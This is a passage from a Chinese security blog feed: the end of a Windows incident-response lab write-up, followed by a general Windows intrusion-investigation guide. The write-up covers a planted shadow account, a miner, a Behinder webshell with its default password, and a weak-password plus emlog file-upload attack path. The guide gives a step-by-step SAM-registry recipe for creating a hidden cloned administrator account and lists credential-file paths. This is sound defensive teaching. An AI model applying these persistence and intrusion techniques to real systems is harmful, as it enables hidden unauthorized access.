class="line">svchost.exe                   6384 LicenseManager</span><br><span class="line">vmtoolsd.exe                  4376 暂缺</span><br><span class="line">WmiPrvSE.exe                  5928 暂缺</span><br><span class="line">svchost.exe                   1244 Appinfo</span><br><span class="line">svchost.exe                   1408 fdPHost</span><br><span class="line">svchost.exe                   7032 FDResPub</span><br><span class="line">MicrosoftEdgeUpdate.exe       8060 暂缺</span><br><span class="line">MicrosoftEdgeUpdate.exe       8096 暂缺</span><br><span class="line">svchost.exe                   7016 DPS</span><br><span class="line">svchost.exe                   6620 WdiSystemHost</span><br><span class="line">taskhostw.exe                 6960 暂缺</span><br><span class="line">svchost.exe                   7308 PcaSvc</span><br><span class="line">svchost.exe                   6064 StorSvc</span><br><span class="line">svchost.exe                   7252 UALSVC</span><br><span class="line">MicrosoftEdgeUpdate.exe       5172 edgeupdate</span><br><span class="line">svchost.exe                   3084 cbdhsvc_37c8d</span><br><span class="line">svchost.exe                   7512 DoSvc</span><br><span class="line">svchost.exe                   7692 UsoSvc</span><br><span class="line">phpstudy_pro.exe              7880 暂缺</span><br><span class="line">svchost.exe                   4504 ClipSVC</span><br><span class="line">svchost.exe                   3652 DsSvc</span><br><span class="line">svchost.exe                   1644 smphost</span><br><span class="line">WinSAT.exe                    8088 暂缺</span><br><span class="line">conhost.exe                   5480 暂缺</span><br><span class="line">smartscreen.exe               7368 暂缺</span><br><span class="line">cmd.exe                       2776 暂缺</span><br><span class="line">conhost.exe                   2280 暂缺</span><br><span class="line">tasklist.exe                  2656 暂缺</span><br></pre></td></tr></table></figure><h3 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h3><p><code>win+r</code>:<code>lusrmgr.msc</code>发现一个影子账户:<code>hack168$</code>或<code>net localgroup administrators</code>只能查看通过<code>$</code>符号隐藏的账户</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031837728.png" data-fancybox="true"/></div></div><p>在该用户下发现执行程序一个,提取出后上传到微步在线分析一下,由于此程序是模拟出来的恶意软件所以微步并判断出是否为恶意程序</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031837412.png" data-fancybox="true"/></div></div><p>以下反编译内容来自<a href="https://mp.weixin.qq.com/s?biz=MzkxMTUwOTY1MA==&mid=2247485188&idx=2&sn=54b8962a88b9da74a3db436f515b815b&chksm=c11a56f9f66ddfefd0ca7402617e4c5665033b0305a5f66a1434630b9795b09fa23fc63d3c12&scene=21#wechat_redirect">题解</a></p><p>在桌面处找到位置程序,运行后cpu飙升,判别为挖矿程序,分析该文件</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031837883.png" data-fancybox="true"/></div></div><p>该图标为pyinstaller打包<strong>通过Google识图也可以找到这是什么打包的,如何反编译</strong>.</p><p><a href="https://blog.csdn.net/m0_37552052/article/details/88093427">使用pyinstxtractor进行反编译</a></p><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/extremecoders-re/pyinstxtractor"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=extremecoders-re&repo=pyinstxtractor&theme=dark&show_owner=true"/></a></div><mark class="tag-plugin colorful mark" color="error">pyinstxtractor需要3.8版本的Python运行</mark><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031837283.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031837654.png" data-fancybox="true"/></div></div><p>得到pyc文件</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838577.png" data-fancybox="true"/></div></div><p>使用<a href="https://tool.lu/pyc/">在线pyc反编译工具</a>,得到源码</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838590.png" data-fancybox="true"/></div></div><h3 id="分析开机自启程序"><a href="#分析开机自启程序" class="headerlink" title="分析开机自启程序"></a>分析开机自启程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">(ProfilePath)\Start Menu\Programs\Startup 启动项</span><br><span class="line">msconfig 启动选项卡</span><br><span class="line">gpedit.msc 组策略编辑器</span><br></pre></td></tr></table></figure><h3 id="查看计划或定时任务"><a href="#查看计划或定时任务" class="headerlink" title="查看计划或定时任务"></a>查看计划或定时任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Tasks\</span><br><span class="line">C:\Windows\SysWOW64\Tasks\</span><br><span class="line">C:\Windows\tasks\</span><br><span class="line">schtasks</span><br><span class="line">taskschd.msc</span><br><span class="line">compmgmt.msc</span><br></pre></td></tr></table></figure><h2 id="Web应急响应"><a href="#Web应急响应" class="headerlink" title="Web应急响应"></a>Web应急响应</h2><p>开着PHPStudy那估计就会有web服务器,虽然背景中也说了,进入网站根目录,查找是否存在Webshell,或通过<code>%UserProfile%\Recent</code>查找最近修改的文件记录</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838548.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838889.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838670.png" data-fancybox="true"/></div></div><p>没有发现可疑文件,也可换其他工具,这里查找中间件日志文件快速浏览</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838560.png" data-fancybox="true"/></div></div><p>相关中间件日志都要快速过一遍,在<code>access.log</code>中发现可疑路径<code>192.168.126.1 - - [26/Feb/2024:22:46:23 +0800] &quot;GET /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</code></p><p>查看该文件内容,发现是个冰蝎马</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838736.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838543.png" data-fancybox="true"/></div></div><p>密码为默认密码:rebeyond攻击IP为:192.168.126.1</p><p>继续查看日志寻找shell前后请求,发现了大量的POST请求同一页面并且状态码为302,猜测可能存在弱口令,联系运维人员确认是否为弱口令或者查看全流量设备</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838425.png" data-fancybox="true"/></div></div><p>通过弱口令:<code>admin 123456</code>登录到后台查看CMS框架及版本号<code>emlog pro2.2.0</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838239.png" data-fancybox="true"/></div></div><p>搜索<code>emlog pro2.2.0 历史漏洞</code>得到<code>/admin/plugin.php</code>存在任意文件上传,并且和日志中的攻击路径吻合</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838936.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838914.png" data-fancybox="true"/></div></div><h2 id="系统应急响应"><a href="#系统应急响应" class="headerlink" title="系统应急响应"></a>系统应急响应</h2><p>通过eventvwr查看用户创建日志,发现是直接通过administrator管理员用户创建的影子账户.由于没用pcap包无法判断是否通过冰蝎马创建</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031838269.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031839736.png" data-fancybox="true"/></div></div><p>powershell无异常</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031839343.png" data-fancybox="true"/></div></div><p>发现此用户通过RDP远程登陆了此机器</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031839071.png" data-fancybox="true"/></div></div><h2 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407150826626.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows" scheme="https://jiangjiyue.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>应急响应之Windows</title>
    <link href="https://jiangjiyue.github.io/2024/07/08/b7b8d727/"/>
    <id>https://jiangjiyue.github.io/2024/07/08/b7b8d727/</id>
    <published>2024-07-08T05:34:49.000Z</published>
    <updated>2024-10-09T01:37:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 28.89K</p>    </div>    <div class="cell" style="">    <p>代码: 6.84K, 文本: 5.58K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 54 分钟</p>    </div>    </div><blockquote><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时,急需第一时间进行处理,使企业的网络信息系统在最短时间内恢复正常工作,进一步查找入侵来源,还原入侵事故过程,同时给出解决方案与防范措施,为企业挽回或减少经济损失</p></blockquote><p>常见的应急响应事件分类:</p><ol><li><p>web入侵:网页挂马、主页篡改、Webshell</p></li><li><p>系统入侵:病毒木马、勒索软件、远控后门</p></li><li><p>网络攻击:DDOS攻击、DNS劫持、ARP欺骗</p></li></ol><h2 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407040913960.jpg" data-fancybox="true"/></div></div><p>在简单做完定向分析并取证后,如果客户直接把系统重置了就不需要下一步了,如果客户要求从头到尾把系统排查一下那么就利用工具和手法进行排查。</p><p>对账户、进程、端口、服务、启动项、计划任务、文件、日志进行逐个检测,</p><h3 id="系统基本信息"><a href="#系统基本信息" class="headerlink" title="系统基本信息"></a>系统基本信息</h3><p>将隐藏文件和后缀名显示打开!!!</p><ol><li><p><code>msinfo32</code>查看Windows信息</p><ol><li>硬件信息</li><li>运行任务</li><li>服务</li><li>系统驱动程序</li><li>加载的模块</li><li>启动程序</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101049269.png" data-fancybox="true"/></div></div></li><li><p><code>systeminfo</code></p><ol><li>查看补丁是否齐全,是否存在<code>ms08-067</code>相关漏洞<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101049782.png" data-fancybox="true"/></div></div></li><li>工具<div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=AonCyberLabs&repo=Windows-Exploit-Suggester&theme=dark&show_owner=true"/></a></div><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/peass-ng/PEASS-ng"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=peass-ng&repo=PEASS-ng&theme=dark&show_owner=true"/></a></div></li></ol></li></ol><h3 id="查找可疑目录及文件"><a href="#查找可疑目录及文件" class="headerlink" title="查找可疑目录及文件"></a>查找可疑目录及文件</h3><h4 id="相关目录"><a href="#相关目录" class="headerlink" title="相关目录"></a>相关目录</h4><table><thead><tr><th>下载目录</th><th>回收站文件</th></tr></thead><tbody><tr><td>Temp</td><td>History</td></tr><tr><td>应用程序打开历史</td><td>搜索历史</td></tr><tr><td>Lnk</td><td>驱动:(cmd&gt;Drivequery)日期</td></tr><tr><td>进程dll关联查询(tasklist -m)</td><td>共享文件(cmd&gt;Net share)</td></tr><tr><td>最近的文件(资源管理器&gt;%UserProfile%\Recent)</td><td>文件更新</td></tr><tr><td>已安装文件,控制面板或者(regedit&gt;\software\Microsoft\Windows\CurrentVersion\Uninstall\)</td><td></td></tr></tbody></table><table><thead><tr><th>Directory</th><th>Description</th></tr></thead><tbody><tr><td>C:\Windows\System32\drivers\etc\hosts</td><td>DNS文件</td></tr><tr><td>C:\Windows\System32\drivers\etc\networks</td><td>网络配置文件</td></tr><tr><td>C:\Windows\System32\config\SAM</td><td>用户名及密码文件</td></tr><tr><td>C:\Windows\System32\config\SECURITY</td><td>Security日志文件</td></tr><tr><td>C:\Windows\System32\config\SOFTWARE</td><td>Software日志文件</td></tr><tr><td>C:\Windows\System32\config\SYSTEM</td><td>System日志文件</td></tr><tr><td>C:\Windows\System32\config\winevt\</td><td>Windows事件日志</td></tr><tr><td>C:\Windows\repair\SAM</td><td>用户名及密码备份文件</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法</span></span><br><span class="line">a. 查看用户目录,新建账号会在这个目录生成一个用户目录,查看是否有新建用户目录.</span><br><span class="line"><span class="comment"># Window 2003:</span></span><br><span class="line">C:\Documents and Settings</span><br><span class="line"><span class="comment"># Window 2008 R2:</span></span><br><span class="line">C:\Users\</span><br><span class="line">b. 单击【开始】&gt;【运行】,输入</span><br><span class="line">   C:\Documents and Settings\Administrator\Recent</span><br><span class="line">   C:\Documents and Settings\Default User\Recent</span><br><span class="line">   %UserProfile%\Recent</span><br><span class="line">分析最近打开分析可疑文件.</span><br><span class="line">c. 在服务器各个目录,可根据文件夹内文件列表时间进行排序,查找可疑文件.</span><br><span class="line">d. forfiles /?</span><br><span class="line"></span><br><span class="line">FORFILES [/P pathname] [/M searchmask] [/S]</span><br><span class="line">         [/C <span class="built_in">command</span>] [/D [+ | -] &#123;yyyy/MM/dd | <span class="built_in">dd</span>&#125;]</span><br><span class="line"></span><br><span class="line">描述:</span><br><span class="line">    选择一个文件(或一组文件)并在那个文件上</span><br><span class="line">    执行一个命令。这有助于批处理作业。</span><br><span class="line"></span><br><span class="line">参数列表:</span><br><span class="line">    /P    pathname      表示开始搜索的路径。默认文件夹是当前工作的</span><br><span class="line">                        目录 (.)。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /M    searchmask    根据搜索掩码搜索文件。默认搜索掩码是 <span class="string">&#x27;*&#x27;</span>。</span><br><span class="line"></span><br><span class="line">    /S                  指导 forfiles 递归到子目录。像 <span class="string">&quot;DIR /S&quot;</span>。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /C    <span class="built_in">command</span>       表示为每个文件执行的命令。命令字符串应该</span><br><span class="line">                        用双引号括起来。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        默认命令是 <span class="string">&quot;cmd /c echo @file&quot;</span>。下列变量</span><br><span class="line">                        可以用在命令字符串中:</span><br><span class="line"></span><br><span class="line">                        @file    - 返回文件名。</span><br><span class="line">                        @fname   - 返回不带扩展名的文件名。</span><br><span class="line"></span><br><span class="line">                        @ext     - 只返回文件的扩展名。</span><br><span class="line"></span><br><span class="line">                        @path    - 返回文件的完整路径。</span><br><span class="line">                        @relpath - 返回文件的相对路径。</span><br><span class="line"></span><br><span class="line">                        @isdir   - 如果文件类型是目录，返回 <span class="string">&quot;TRUE&quot;</span>；</span><br><span class="line">                                   如果是文件，返回 <span class="string">&quot;FALSE&quot;</span>。</span><br><span class="line">                        @fsize   - 以字节为单位返回文件大小。</span><br><span class="line"></span><br><span class="line">                        @fdate   - 返回文件上一次修改的日期。</span><br><span class="line"></span><br><span class="line">                        @ftime   - 返回文件上一次修改的时间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        要在命令行包括特殊字符，字符请以 0xHH</span><br><span class="line">                        形式使用十六进制代码(例如，0x09 为 tab)。</span><br><span class="line"></span><br><span class="line">                        内部 CMD.exe 命令前面应以 <span class="string">&quot;cmd /c&quot;</span> 开始。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /D    <span class="built_in">date</span>          选择文件，其上一次修改日期大于或等于 (+)，</span><br><span class="line">                        或者小于或等于 (-) 用 <span class="string">&quot;yyyy/MM/dd&quot;</span> 格式指定的日期;</span><br><span class="line"></span><br><span class="line">                        或选择文件，其上一次修改日期大于或等于 (+)</span><br><span class="line">                        当前日期加 <span class="string">&quot;dd&quot;</span> 天，或者小于或等于 (-) 当前</span><br><span class="line"></span><br><span class="line">                        日期减 <span class="string">&quot;dd&quot;</span> 天。有效的 <span class="string">&quot;dd&quot;</span> 天数可以是</span><br><span class="line">                        0 - 32768 范围内的任何数字。如果没有指定，</span><br><span class="line"></span><br><span class="line">                        <span class="string">&quot;+&quot;</span> 被当作默认符号。</span><br><span class="line"></span><br><span class="line">    /?                  显示此帮助消息。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">    FORFILES /?</span><br><span class="line">    FORFILES</span><br><span class="line">    FORFILES /P C:\WINDOWS /S /M DNS*.*</span><br><span class="line">    FORFILES /S /M *.txt /C <span class="string">&quot;cmd /c type @file | more&quot;</span></span><br><span class="line">    FORFILES /P C:\ /S /M *.bat</span><br><span class="line">    FORFILES /D -30 /M *.exe</span><br><span class="line">             /C <span class="string">&quot;cmd /c echo @path 0x09 在 30 前就被更改。&quot;</span></span><br><span class="line">    FORFILES /D 2001/01/01</span><br><span class="line">             /C <span class="string">&quot;cmd /c echo @fname 在 2001年1月1日就是新的。&quot;</span></span><br><span class="line">    FORFILES /D +2024/7/18 /C <span class="string">&quot;cmd /c echo @fname 今天是新的。&quot;</span></span><br><span class="line">    FORFILES /M *.exe /D +1</span><br><span class="line">    FORFILES /S /M *.doc /C <span class="string">&quot;cmd /c echo @fsize&quot;</span></span><br><span class="line">    FORFILES /M *.txt /C <span class="string">&quot;cmd /c if @isdir==FALSE notepad.exe @file&quot;</span></span><br></pre></td></tr></table></figure><h4 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动项</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run</span><br><span class="line"><span class="comment"># 用户登录</span></span><br><span class="line">HKCU\Environment</span><br><span class="line">HKLM\SOFTWARE\Microft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line"><span class="comment"># 定时任务/计划任务</span></span><br><span class="line">1. 单击[开始]&gt;[设置]&gt;[控制面板]&gt;[任务计划],查看计划任务属性,便可以发现木马文件的路径</span><br><span class="line">2. 单击[开始]&gt;[运行];输入cmd,然后输入at,检查计算机与网络上的其它计算机之间的会话或计划任务,如有,则确认是否为正常连接</span><br><span class="line"><span class="comment"># 服务自启动</span></span><br><span class="line">1. 单击[开始]&gt;[运行],输入services.msc,注意服务状态和启动类型,检查是否有异常服务</span><br><span class="line"><span class="comment"># dll劫持</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\SessionManager\ExcludeFromKnownDlls</span><br><span class="line"><span class="comment"># COM劫持</span></span><br><span class="line">%APPDATA%\Roaming\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\</span><br></pre></td></tr></table></figure><h4 id="程序运行记录"><a href="#程序运行记录" class="headerlink" title="程序运行记录"></a>程序运行记录</h4><p>使用<code>WinPrefetchView</code>解析<code>Prefetch</code>文件夹中的<code>.pf</code>文件取证。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262005576.png" data-fancybox="true"/></div></div><h3 id="检查系统账号安全"><a href="#检查系统账号安全" class="headerlink" title="检查系统账号安全"></a>检查系统账号安全</h3><ol><li><p>查看服务器是否有弱口令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line">据实际情况咨询相关服务器管理员</span><br></pre></td></tr></table></figure></li><li><p>查看服务器是否存在可疑账号、新增账号.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line">lusrmgr.msc 查看是否有新增/可疑的账号</span><br><span class="line">net  localgroup administrators</span><br><span class="line">wmic UserAccount get</span><br><span class="line">在管理员群组的（Administrators）里如有新增账户,请立即禁用或删除掉.</span><br><span class="line">使用D盾、HM查杀工具,集成了对克隆账号检测的功能.</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051937269.png" data-fancybox="true"/></div></div></li><li><p>结合日志,查看管理员登录时间、用户名是否存在异常.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line">a. Win+R打开运行,输入<span class="string">&quot;eventvwr.msc&quot;</span>,回车运行,打开<span class="string">&quot;事件查看器&quot;</span></span><br><span class="line">b. 导出Windows日志--安全,利用LogParser进行分析</span><br><span class="line">LogParser.exe -i:EVT <span class="string">&quot;SELECT TimeGenerated AS LoginTime, EXTRACT_TOKEN(Strings, 5, &#x27;|&#x27;) AS username FROM C:\Users\Administrator\Desktop\Security.evtx WHERE EventID = 4624&quot;</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041911477.png" data-fancybox="true"/></div></div></li><li><p>wmic命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get Name,SID</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041913278.png" data-fancybox="true"/></div></div></li></ol><h4 id="隐藏账号-番外篇"><a href="#隐藏账号-番外篇" class="headerlink" title="隐藏账号-番外篇"></a>隐藏账号-番外篇</h4><p>window 隐藏系统用户操作,CMD命令行下,建立了一个用户名为<code>youzi$</code>,密码为<code>youzi$</code>的简单隐藏账户,并且把该隐藏账户提升为了管理员权限.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051919583.png" data-fancybox="true"/></div></div><mark class="tag-plugin colorful mark" color="red">CMD命令行使用net user,看不到test$这个账号,但在控制面板和本地用户和组是可以显示此用户</mark><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051921594.png" data-fancybox="true"/></div></div><p><strong>克隆账号制作过程:</strong></p><ol><li>“开始”→“运行”,输入<code>regedit</code>后回车,需要到<code>HKEY_LOCAL_MACHINE\SAM\SAM</code>,单机右建权限,给予<code>administrator</code>用户完全控制以及读取的权限,在后面打勾就行.然后关闭注册表编辑器,再次打开即可<br><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051923051.png" data-fancybox="true"/></div></div><br><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051924129.png" data-fancybox="true"/></div></div></li><li>来到注册表编辑器的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>处,点击<code>youzi$</code>用户,得到在右边显示的键值中的”类型”一项显示为<code>0x3F9</code>,找到箭头所指目录.<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051929117.png" data-fancybox="true"/></div></div></li><li>找到<code>administrator</code>所对应的的项为<code>000001F4</code>,将<code>00001F4</code>的F值复制到<code>000003F9</code>的F值中,保存.<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051925983.png" data-fancybox="true"/></div></div></li><li>分别<code>youzi$</code>和<code>000003F9</code>导出到桌面,删除<code>youzi$</code>用户<code>net user youzi$ /del</code><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051930847.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051930958.png" data-fancybox="true"/></div></div></li><li>将刚才导出的两个后缀为.reg的注册表项导入注册表中.这样所谓的隐藏账户就创建好了.<mark class="tag-plugin colorful mark" color="red">PS:不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的,只有在注册表中才能看得到</mark><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051935147.png" data-fancybox="true"/></div></div><div class="tag-plugin 